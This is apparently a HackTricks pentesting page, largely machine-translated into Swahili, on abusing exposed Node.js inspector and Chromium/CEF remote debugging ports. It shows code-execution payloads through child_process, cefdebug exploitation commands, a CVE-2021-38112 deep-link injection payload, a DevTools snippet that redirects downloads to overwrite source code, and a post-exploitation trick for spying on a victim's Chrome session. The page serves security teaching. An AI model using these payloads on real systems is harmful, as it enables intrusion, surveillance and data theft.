# Node inspector/CEF debug abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wakati inapoanzishwa na swichi `--inspect`, mchakato wa Node.js unasikiliza mteja wa ufuatiliaji. Kwa **kawaida**, itasikiliza kwenye mwenyeji na bandari **`127.0.0.1:9229`**. Kila mchakato pia umepewa **UUID** **maalum**.

Wateja wa mfuatiliaji lazima wajue na kubainisha anwani ya mwenyeji, bandari, na UUID ili kuungana. URL kamili itakuwa na muonekano kama `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Kwa sababu **mfuatiliaji ana ufikiaji kamili wa mazingira ya utekelezaji wa Node.js**, mhusika mbaya anayeweza kuungana na bandari hii anaweza kuwa na uwezo wa kutekeleza msimbo wowote kwa niaba ya mchakato wa Node.js (**kuinua hadhi inayoweza kutokea**).
{% endhint %}

Kuna njia kadhaa za kuanzisha mfuatiliaji:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wakati unapoanza mchakato ulioangaliwa kitu kama hiki kitaonekana:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Mchakato unaotegemea **CEF** (**Chromium Embedded Framework**) kama unahitaji kutumia param: `--remote-debugging-port=9222` kufungua **debugger** (ulinzi wa SSRF unabaki kuwa sawa). Hata hivyo, wao **badala yake** ya kutoa kikao cha **NodeJS** **debug** kitawasiliana na kivinjari kwa kutumia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), hii ni kiolesura cha kudhibiti kivinjari, lakini hakuna RCE ya moja kwa moja.

Unapoanzisha kivinjari kilichosahihishwa kitu kama hiki kitaonekana:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zinazofunguliwa kwenye kivinjari cha wavuti zinaweza kufanya maombi ya WebSocket na HTTP chini ya mfano wa usalama wa kivinjari. **Muunganisho wa awali wa HTTP** unahitajika ili **kupata kitambulisho cha kipekee cha kikao cha debugger**. **Sera ya asili sawa** **inazuia** tovuti kuwa na uwezo wa kufanya **muunganisho huu wa HTTP**. Kwa usalama wa ziada dhidi ya [**shambulio la DNS rebinding**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js inathibitisha kwamba **'Headers za Host'** za muunganisho zinabainisha **anwani ya IP** au **`localhost`** au **`localhost6`** kwa usahihi.

{% hint style="info" %}
Hizi **mbinu za usalama zinazuia kutumia mpelelezi** kuendesha msimbo kwa **kutuma tu ombi la HTTP** (ambalo linaweza kufanywa kwa kutumia udhaifu wa SSRF).
{% endhint %}

### Kuanzisha mpelelezi katika michakato inayotembea

Unaweza kutuma **ishara SIGUSR1** kwa mchakato wa nodejs unaotembea ili kuufanya **uanze mpelelezi** katika bandari ya kawaida. Hata hivyo, kumbuka kwamba unahitaji kuwa na ruhusa za kutosha, hivyo hii inaweza kukupa **ufikiaji wa ruhusa kwa habari ndani ya mchakato** lakini si kupanda kwa moja kwa moja kwa ruhusa.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Hii ni muhimu katika kontena kwa sababu **kuzima mchakato na kuanzisha mpya** na `--inspect` si **chaguo** kwa sababu **konteina** itakuwa **imeuawa** pamoja na mchakato.
{% endhint %}

### Unganisha na inspector/debugger

Ili kuungana na **browa ya msingi wa Chromium**, URLs `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubonyeza kitufe cha Configure, inapaswa kuhakikisha kuwa **mwenyeji wa lengo na bandari** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):

![](<../../.gitbook/assets/image (674).png>)

Kwa kutumia **command line** unaweza kuungana na debugger/inspector kwa:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Chombo [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), kinaruhusu **kupata wakaguzi** wanaotembea kwa ndani na **kuiingiza msimbo** ndani yao.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ikiwa umeunganishwa na kivinjari kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kuangalia API ili kupata mambo ya kuvutia ya kufanya nayo).
{% endhint %}

## RCE katika NodeJS Debugger/Inspector

{% hint style="info" %}
Ikiwa umekuja hapa kutafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Njia kadhaa za kawaida za kupata **RCE** unapoweza **kuunganisha** na Node **inspector** ni kutumia kitu kama (inaonekana kwamba hii **haitafanya kazi katika muunganisho wa Chrome DevTools protocol**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In this section I will just list interesting things I find people have used to exploit this protocol.

### Parameter Injection via Deep Links

In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **ilirekodi URI maalum** katika mfumo (workspaces://) ambayo ilipokea URI kamili na kisha **kuanzisha programu ya msingi ya CEF** na usanidi ambao ulikuwa unajengwa kwa sehemu kutoka URI hiyo.

Iligundulika kwamba vigezo vya URI vilikuwa vimepandishwa URL na kutumika kuanzisha programu ya msingi ya CEF, ikiruhusu mtumiaji **kuingiza** bendera **`--gpu-launcher`** katika **mstari wa amri** na kutekeleza mambo yasiyo ya kawaida.

So, a payload like:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Itatekeleza calc.exe.

### Badilisha Faili

Badilisha folda ambapo **faili zilizopakuliwa zitahifadhiwa** na upakue faili ili **kuandika upya** **kanuni ya chanzo** inayotumika mara kwa mara ya programu kwa **kanuni yako mbaya**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE na exfiltration

Kulingana na chapisho hili: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) inawezekana kupata RCE na exfiltrate kurasa za ndani kutoka theriver.

### Baada ya Utekelezaji

Katika mazingira halisi na **baada ya kuathiri** PC ya mtumiaji anaye tumia kivinjari kinachotegemea Chrome/Chromium unaweza kuzindua mchakato wa Chrome na **kuanzisha ufuatiliaji wa makosa na kupeleka bandari ya ufuatiliaji** ili uweze kuifikia. Kwa njia hii utaweza **kukagua kila kitu ambacho mwathirika anafanya na Chrome na kuiba taarifa nyeti**.

Njia ya siri ni **kuondoa kila mchakato wa Chrome** na kisha kuita kitu kama
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
